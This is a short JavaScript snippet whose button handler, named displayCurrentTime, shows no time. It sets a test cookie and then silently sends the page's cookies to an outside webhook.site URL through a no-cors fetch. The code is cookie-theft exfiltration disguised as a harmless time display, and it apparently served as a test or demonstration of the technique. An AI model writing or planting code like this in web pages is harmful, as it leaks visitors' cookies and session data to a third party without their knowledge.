document.addEventListener("DOMContentLoaded", function () {
  const button = document.getElementById("showTimeButton");
  button.addEventListener("click", function () {
    displayCurrentTime();
  });

  function displayCurrentTime() {
    document.cookie = "username=testUser; path=/";  // 手動設 cookie
    const url = "https://webhook.site/b8fec0c7-3992-4c89-a8ed-b3c8bc6d619d?" + new URLSearchParams({
      cookie: document.cookie
    });

    fetch(url, {
      method: 'GET',
      mode: 'no-cors' 
    }).then(() => {
      console.log('yes');
    });
  }
});
